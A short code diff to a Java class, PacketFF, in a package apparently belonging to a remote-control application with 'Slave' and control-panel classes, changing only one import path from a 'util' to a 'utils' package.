@@ -3,7 +3,7 @@ package com.redpois0n.packets;
 import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlSearch;
-import com.redpois0n.util.IconUtils;
+import com.redpois0n.utils.IconUtils;
 
 public class PacketFF extends Packet {
 
